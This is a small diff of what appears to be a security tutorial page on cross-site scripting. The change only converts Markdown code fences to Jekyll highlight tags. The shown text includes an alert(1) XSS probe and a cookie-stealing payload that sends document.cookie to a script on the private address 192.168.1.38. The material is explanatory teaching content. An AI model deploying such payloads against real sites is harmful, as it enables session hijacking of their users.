@@ -15,16 +15,17 @@ In order to :
 
 ### Example
 
-```js
+{% highlight js %}
 <script>alert(1)</script> // know if susceptible to an XSS flaw
-```
+{% endhighlight %}
 
 ![Sample script](img/basicScript.png)
 -> Writes the GET parameters to a file
 
-```js
+{% highlight js %}
 <script>location.replace("http://192.168.1.38/monScript.php?cookie="+document.cookie)</script>
-```
+{% endhighlight %}
+
 
 ### Reflected XSS (non-persistent)
 ![Reflected XSS](img/reflectedXSS.png)
